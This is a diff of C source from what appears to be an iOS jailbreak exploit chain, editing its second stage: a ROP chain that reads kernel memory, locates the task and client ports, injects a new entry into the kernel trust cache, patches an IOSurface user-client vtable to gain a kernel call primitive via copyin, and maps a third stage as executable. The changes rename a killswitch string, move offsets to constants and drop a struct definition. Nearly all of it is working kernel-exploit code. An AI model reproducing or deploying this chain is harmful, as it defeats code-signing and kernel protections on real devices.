@@ -11,7 +11,7 @@
 #include "stage2.h"
 #include "stage1.h"
 
-#include "../shared/jboffsets.h"
+#include "../shared/offsets.h"
 #include "generated/stage2_hash3.h"
 #include "generated/stage2_hash4.h"
 
@@ -312,6 +312,9 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 	int longjmp_buf = 1;
 	int pos = 0;
 	char * pos_buf = NULL;
+#if STAGE1FD_SCREAM_TEST
+	LOG("Stage 1 fd scream test is active\n\n")
+#endif
 	LOG("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm",offsets->stage2_base);
 	while (next != NULL) {
 		switch (next->type) {
@@ -831,10 +834,10 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	ROP_VAR_ARG64("reply_port",5);
 	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
 
-	// setup the compare string ("__developer_mode_enabled")
+	// setup the compare string ("__spice_untether_disable")
 	char * cmp_str = malloc(100);
 	memset(cmp_str,0,100);
-	snprintf(cmp_str,100,"__developer_mode_enabled");
+	snprintf(cmp_str,100,"__spice_untether_disable");
 	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
 	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
 	// call strcmp and save the ret value
@@ -851,7 +854,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	ADD_LOOP_START("killswitch loop")
 		// set x0 to the value of strcmp
 		SET_X0_FROM_ROP_VAR("strcmp_retval");
-		// break out of the loop if x0 is nonzero
+		// break out of the loop if x0 is nonzero (i.e. loop forever if string matches)
 		ADD_LOOP_BREAK_IF_X0_NONZERO("killswitch loop");
 
 		ADD_USLEEP(1000); // if not just sleep and do that in an endless loop (TODO: can't we call exit here also? I think this might be an issue with keep alive tho so it's prob better to spin)
@@ -1087,7 +1090,7 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("out_sz",8,tmp);
 	SET_ROP_VAR64("out_sz",1);
 #define kr32(addr_var,valuename) \
-	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,0,8); \
+	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",OFF_IPR_SIZE,addr_var,0,8); \
 	ROP_VAR_ARG_HOW_MANY(4); \
 	ROP_VAR_ARG64("self",1); \
 	ROP_VAR_ARG64("the_one",2); \
@@ -1118,7 +1121,7 @@ _STRUCT_ARM_THREAD_STATE64
 	// get the task pointer from our recv addr
 	DEFINE_ROP_VAR("task_pointer",8,tmp);
 	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
-	SET_ROP_VAR64("heap_addr_task_ptr",offsets->is_task);
+	SET_ROP_VAR64("heap_addr_task_ptr",OFF_IS_TASK);
 	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
 	kr64("heap_addr_task_ptr","task_pointer");
 
@@ -1132,7 +1135,7 @@ _STRUCT_ARM_THREAD_STATE64
 	// get the address of the client port
 	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
 	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
-	SET_ROP_VAR64("ip_kobject_ptr",offsets->itk_registered);
+	SET_ROP_VAR64("ip_kobject_ptr",OFF_ITK_REGISTERED);
 	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
 	kr64("ip_kobject_ptr","ip_kobject_client_port");
 
@@ -1156,7 +1159,7 @@ _STRUCT_ARM_THREAD_STATE64
 	// fully setup trust chain entry now
 	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
 	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
-	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
+	SET_ROP_VAR64("bss_trust_chain_head_ptr",OFF_TRUST_CACHE);
 	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
 	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
 	ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0,8);
@@ -1237,7 +1240,7 @@ _STRUCT_ARM_THREAD_STATE64
 	//SET_ROP_VAR64_W_OFFSET("fakeport",0x4141414141414140,offsetof(kport_t,ip_kobject));
 	
 	// patch getExternalTrapForIndex
-	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
+	SET_ROP_VAR64("tmp_uint64",OFF_ADD_X0_X0_RET);
 	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
 	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);
 
@@ -1245,7 +1248,7 @@ _STRUCT_ARM_THREAD_STATE64
 	
 	// setup call primitive
 	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
-	SET_ROP_VAR64("copyin_func_ptr",offsets->copyin);
+	SET_ROP_VAR64("copyin_func_ptr",OFF_COPYIN);
 	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
 	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
 	// setup x0
@@ -1284,76 +1287,6 @@ _STRUCT_ARM_THREAD_STATE64
 	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);
 
 	// populate the struct we pass over to stage 3 with all the values it needs
-	typedef struct {
-		struct {
-			kptr_t kernel_image_base;
-		} constant;
-
-		struct {
-			kptr_t copyin;
-			kptr_t copyout;
-			kptr_t current_task;
-			kptr_t get_bsdtask_info;
-			kptr_t vm_map_wire_external;
-			kptr_t vfs_context_current;
-			kptr_t vnode_lookup;
-			kptr_t osunserializexml;
-			kptr_t smalloc;
-
-			kptr_t ipc_port_alloc_special;
-			kptr_t ipc_kobject_set;
-			kptr_t ipc_port_make_send;
-		} funcs;
-
-		struct {
-			kptr_t add_x0_x0_ret;
-		} gadgets;
-
-		struct {
-			kptr_t realhost;
-			kptr_t zone_map;
-			kptr_t kernel_task;
-			kptr_t kern_proc;
-			kptr_t rootvnode;
-			kptr_t osboolean_true;
-			kptr_t trust_cache;
-		} data;
-
-		struct {
-			kptr_t iosurface_root_userclient;
-		} vtabs;
-
-		struct {
-			uint32_t is_task_offset;
-			uint32_t task_itk_self;
-			uint32_t itk_registered;
-			uint32_t ipr_size;
-			uint32_t sizeof_task;
-			uint32_t task_all_image_info_addr;
-			uint32_t task_all_image_info_size;
-		} struct_offsets;
-
-		struct {
-			uint32_t create_outsize;
-			uint32_t create_surface;
-			uint32_t set_value;
-		} iosurface;
-
-		struct {
-			void (*write) (int fd,void * buf,uint64_t size);
-			kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
-			kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
-			mach_port_name_t (*mach_task_self) ();
-			kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
-			kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
-			kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
-			kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
-			kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
-			kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
-			mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
-			int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
-		} userland_funcs;
-	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
 	memset(lib_offsets,0,sizeof(offsets_t));
 	lib_offsets->constant.kernel_image_base = OFF_KERNEL_IMAGE_BASE;
@@ -1386,8 +1319,7 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->struct_offsets.task_all_image_info_addr = OFF_TASK_ALL_IMAGE_INFO_ADDR;
 	lib_offsets->struct_offsets.task_all_image_info_size = OFF_TASK_ALL_IMAGE_INFO_SIZE;
 	// iosurface stuff isn't set and also isn't used
-	#if N71_11_3_1
-	lib_offsets->userland_funcs.write = (void*)(OFF_WRITE);
+	#if (N66AP & IOS_11_3_1)
 	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(OFF_IOCONNECTTRAP6);
 	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(OFF_MACH_PORTS_LOOKUP);
 	lib_offsets->userland_funcs.mach_task_self = (void*)(OFF_MACH_TASK_SELF);
@@ -1400,7 +1332,6 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->userland_funcs.mach_msg = (void*)(OFF_MACH_MSG);
 	lib_offsets->userland_funcs.posix_spawn = (void*)(OFF_POSIX_SPAWN);
 	#else
-	lib_offsets->userland_funcs.write = (void*)(get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr);
